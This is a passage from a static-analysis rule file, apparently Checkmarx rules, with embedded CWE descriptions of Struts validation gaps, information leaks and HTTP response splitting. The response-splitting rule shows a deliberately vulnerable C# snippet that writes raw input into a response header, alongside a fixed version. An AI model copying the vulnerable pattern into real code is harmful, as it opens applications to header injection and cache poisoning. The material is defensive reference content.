&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;102&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=102" target="_blank"&gt;Struts: Duplicate Validation Forms&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;462&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=462" target="_blank"&gt;Duplicate Key in Associative List (Alist)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relevant Properties"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relevant Properties&lt;/div&gt;&lt;div name="oc_694_Relevant Properties" id="oc_694_Relevant Properties" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Uniqueness&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_694_Content History" id="oc_694_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1685</key><name>Stored_HTTP_Response_Splitting</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Arbitrarily change the application server&amp;rsquo;s response header to a victim&amp;rsquo;s HTTP request by manipulating headers&lt;/li&gt;
&lt;li&gt;Arbitrarily change the application server&amp;rsquo;s response body by injecting two consecutive line breaks, which may result in Cross-Site Scripting (XSS) attacks&lt;/li&gt;
&lt;li&gt;Cause cache poisoning, potentially controlling any site&amp;rsquo;s HTTP responses going through the same proxy as this application.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Since user input is being used in an HTTP response header, an attacker could include NewLine characters to make the header look like multiple headers with engineered content, potentially making the response look like multiple responses (for example, by engineering duplicate content-length headers). This can cause an organizational proxy server to provide the second, engineered response to a victim&amp;#8217;s subsequent request; or, if the proxy server also performs response caching, the attacker can send an immediate subsequent request to another site, causing the proxy server to cache the engineered response as a response from this second site and to later serve the response to other users.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source (including cookies). Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Additionally, URL-encode all user input before including it in the response header.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
User input is being used in an HTTP response header, enabling an attacker to add a newline character and multiple headers
      &lt;/h4&gt;&lt;pre&gt;

public class HTTPResponseSplitting
{
        public void foo(HttpResponse Response)
        {
                String author3 = Console.ReadLine();
                Response.AppendHeader("Author: " + author3);
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The user input is examined to contain and newline character and the input is also URL encoded
      &lt;/h4&gt;&lt;pre&gt;

public class HTTPResponseSplittingFixed
{
        public void foo(HttpResponse Response)
        {
                String author3 = Console.ReadLine();
                if (author3.Contains('\n') == false)
                {
                        author3 = HttpUtility.UrlEncode(author3);
                        Response.AppendHeader("Author: " + author3);
                }
        }
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_666</key><name>Struts_Unvalidated_Action_Form</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Unvalidated Action Form&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;108&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_108_Description" id="oc_108_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Every Action Form must have a corresponding validation
form.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If a Struts Action Form Mapping specifies a form, it must have a
validation form defined under the Struts Validator.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_108_Time of Introduction" id="oc_108_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_108_Applicable Platforms" id="oc_108_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_108_Common Consequences" id="oc_108_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If an action form mapping does not have a validation form defined, it
may be vulnerable to a number of attacks that rely on unchecked input.
Unchecked input is the root cause of some of today's worst and most
common software security problems. Cross-site scripting, SQL injection,
and process control vulnerabilities all stem from incomplete or absent
input validation.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Although J2EE applications are not generally susceptible to memory
corruption attacks, if a J2EE application interfaces with native code
that does not perform array bounds checking, an attacker may be able to
use an input validation mistake in the J2EE application to launch a
buffer overflow attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_108_Potential Mitigations" id="oc_108_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Map every Action Form to a corresponding validation form.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_108_Other Notes" id="oc_108_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;An action or a form may perform validation in other ways, but the Struts
Validator provides an excellent way to verify that all input receives at
least a basic level of checking. Without this approach, it is difficult, and
often impossible, to establish with a high level of confidence that all
input is validated.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_108_Weakness Ordinalities" id="oc_108_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_108_Relationships" id="oc_108_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('108_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_108_Causal Nature" id="oc_108_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_108_Taxonomy Mappings" id="oc_108_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Unvalidated Action Form&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_108_Content History" id="oc_108_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Description,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_606</key><name>Improper_Session_Management</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Information Leak Through Sent Data&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;201&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_201_Description" id="oc_201_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The accidental leaking of sensitive information through sent
data refers to the transmission of data which are either sensitive in and of
itself or useful in the further exploitation of the system through standard data
channels.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_201_Time of Introduction" id="oc_201_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_201_Applicable Platforms" id="oc_201_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_201_Common Consequences" id="oc_201_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Data leakage results in the compromise of data confidentiality.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_201_Demonstrative Examples" id="oc_201_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following is an actual mysql error statement:&lt;/p&gt;&lt;div class="indent Result"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Result)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;SQL&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;Warning: mysql_pconnect(): Access denied for user:
'root@localhost' (Using password: N1nj4) in
/usr/local/www/wi-data/includes/database.inc on line 4&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_201_Potential Mitigations" id="oc_201_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Requirements specification: Specify data output such that no sensitive
data is sent.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Ensure that any possibly sensitive data specified in the requirements
is verified with designers to ensure that it is either a calculated risk
or mitigated elsewhere. Any information that is not necessary to the
functionality should be removed in order to lower both the overhead and
the possibility of security sensitive data being sent.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Compartmentalize your system to have "safe" areas where trust
boundaries can be unambiguously drawn. Do not allow sensitive data to go
outside of the trust boundary and always be careful when interfacing
with a compartment outside of the safe area.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Setup default error message to handle unexpected errors.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
